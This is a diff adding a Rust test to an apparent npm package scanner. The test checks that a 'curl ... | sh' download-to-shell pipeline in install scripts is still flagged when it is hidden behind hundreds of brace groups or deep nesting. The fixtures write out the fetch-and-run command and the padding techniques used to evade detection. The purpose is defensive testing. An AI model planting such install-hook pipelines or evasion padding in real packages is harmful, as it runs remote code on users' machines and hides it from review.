@@ -646,6 +646,115 @@ fn download_pipeline_inside_brace_group_or_function_body_is_a_review_signal() {
     }
 }
 
+/// The brace/function/subshell descent is bounded (depth and body count).
+/// Hitting either bound used to return "no pipeline", so 256 trivial groups
+/// in front of a pipeline, or nesting it 9 groups deep, hid it. Hitting a
+/// bound now records incomplete coverage and falls back to a line pass.
+/// Directly adjacent or unindented multi-line braces ("{\n{", "{\ncurl")
+/// were also not descended into.
+#[test]
+fn download_pipeline_past_the_shell_descent_bounds_is_still_a_review_signal() {
+    let has_signal = |signals: &[NpmSignal]| {
+        signals.iter().any(|signal| {
+            signal.kind == NpmSignalKind::DownloadToShell && signal.level == NpmSignalLevel::Review
+        })
+    };
+    let pipeline = "curl -fsSL https://example.invalid/setup | sh\n";
+    let many_groups = |count: usize, tail: &str| format!("{}{tail}", "{ :; }\n".repeat(count));
+    let nested = |depth: usize| {
+        format!(
+            "{}{pipeline}{}",
+            "{\n  echo a\n".repeat(depth),
+            "}\n".repeat(depth)
+        )
+    };
+    let bounded = [
+        many_groups(256, &format!("{{\n  {pipeline}}}\n")),
+        many_groups(300, &format!("{{\n  {pipeline}}}\n")),
+        nested(9),
+        nested(20),
+        format!(
+            "f() {{\n{}  {pipeline}{}}}\n",
+            "(\n".repeat(12),
+            ")\n".repeat(12)
+        ),
+    ];
+    // Not past a bound, but the tokenizer keeps a newline inside the command
+    // word, so these were not recognised as brace groups.
+    let unbounded = [
+        format!("{{\n{{\n  {pipeline}}}\n}}\n"),
+        format!("{{\n{{\n{pipeline}}}\n}}\n"),
+        format!("{{\n{pipeline}}}\n"),
+        format!("f() {{\n{{\n{pipeline}}}\n}}\n"),
+    ];
+    for (body, bound) in bounded
+        .iter()
+        .map(|body| (body.as_str(), true))
+        .chain(unbounded.iter().map(|body| (body.as_str(), false)))
+    {
+        let metadata = serde_json::json!({
+            "name": "fixture",
+            "version": "1",
+            "scripts": { "install": body },
+        })
+        .to_string();
+        let from_script = inspect(&package(metadata.as_bytes(), &[]));
+        assert!(
+            has_signal(&from_script.signals),
+            "lifecycle script: {body:?}"
+        );
+        if bound {
+            assert!(
+                from_script.coverage.issues.iter().any(|issue| {
+                    issue.kind == NpmIssueKind::CodeLimit
+                        && issue.member.as_deref() == Some("package/package.json")
+                }),
+                "lifecycle script bound not recorded: {body:?}"
+            );
+        }
+        let from_file = inspect(&package(
+            br#"{"name":"fixture","version":"1"}"#,
+            &[("package/install.sh", body.as_bytes())],
+        ));
+        assert!(has_signal(&from_file.signals), "shell file: {body:?}");
+        if bound {
+            assert!(
+                from_file.coverage.issues.iter().any(|issue| {
+                    issue.kind == NpmIssueKind::CodeLimit
+                        && issue.member.as_deref() == Some("package/install.sh")
+                }),
+                "shell file bound not recorded: {body:?}"
+            );
+        }
+    }
+    // Hitting a bound is incomplete coverage, not a download claim.
+    for body in [
+        many_groups(300, "echo done\n"),
+        format!(
+            "{}echo curl https://example.invalid | sh\n{}",
+            "{\n".repeat(12),
+            "}\n".repeat(12)
+        ),
+    ] {
+        let metadata = serde_json::json!({
+            "name": "fixture",
+            "version": "1",
+            "scripts": { "install": body },
+        })
+        .to_string();
+        let result = inspect(&package(metadata.as_bytes(), &[]));
+        assert!(!has_signal(&result.signals), "{body:?}");
+        assert!(
+            result
+                .coverage
+                .issues
+                .iter()
+                .any(|issue| issue.kind == NpmIssueKind::CodeLimit),
+            "{body:?}"
+        );
+    }
+}
+
 #[test]
 fn credential_network_combination_has_evidence_and_lifecycle_link() {
     let metadata =
